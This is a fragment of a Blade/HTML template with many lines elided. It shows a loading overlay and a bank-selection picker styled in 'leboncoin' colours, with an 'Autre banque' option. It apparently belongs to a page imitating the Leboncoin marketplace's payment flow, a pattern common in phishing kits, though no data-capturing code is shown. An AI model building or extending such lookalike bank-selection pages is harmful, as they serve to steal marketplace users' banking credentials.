...
<div id="global-loader" style="position: fixed; inset: 0; z-index: 9999; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.5s ease;">
   ...
   <button 
    type="button"
    id="bankButton"
    class="w-full flex items-center justify-between px-4 py-3 border border-gray-300 rounded-xl bg-white focus:ring-2 focus:ring-leboncoin"
>
    ...
    <svg class="w-5 h-5 text-leboncoin"
         fill="none"
         stroke="currentColor"
         viewBox="0 0 24 24">
        ...
        @foreach($banks as $bank)
            ...
            <button
                ...
                class="bank-option group flex items-center justify-center
                       h-15 sm:h-20
                       rounded-xl bg-white
                       hover:border-leboncoin hover:shadow-md
              ...
              @if($bank['name'] === 'Autre banque')
                    ...
                    <div class="flex flex-col items-center justify-center">
                        <svg xmlns="http://www.w3.org/2000/svg"
                            class="w-5 h-5 text-leboncoin group-hover:text-leboncoin"
                            fill="none"
                            viewBox="0 0 24 24"
                            stroke="currentColor">
                            <path stroke-linecap="round"
                ...
                <img
                    ...
                    alt="{{ $bank['name'] }}"
                    class="w-15 h-10 border-leboncoin object-contain group-hover:scale-110 transition-transform"
                >
               @endif
